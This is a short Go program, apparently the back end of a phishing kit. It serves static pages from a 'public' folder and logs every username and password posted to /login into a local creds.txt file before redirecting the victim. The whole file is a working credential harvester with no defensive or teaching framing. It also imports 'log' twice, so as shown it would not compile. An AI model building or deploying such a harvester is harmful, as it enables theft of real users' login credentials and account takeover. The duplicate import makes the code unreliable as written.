package main

import (
	"log"
	"net/http"
	"os"
	"time"

	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
)

func loginReq(w http.ResponseWriter, r *http.Request) {
	log.WithFields(log.Fields{
		"time":     time.Now().String(),
		"username": r.FormValue("_user"),
		"password": r.FormValue("_pass"),
	}).Info("Login attempt made")
	http.Redirect(w, r, "/", 302)
}

func main() {
	fh, err := os.OpenFile("creds.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}
	defer fh.Close()
	log.SetOutput(fh)
	r := mux.NewRouter()
	r.HandleFunc("/login", loginReq).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
	log.Fatal(http.ListenAndServe(":8000", r))
}
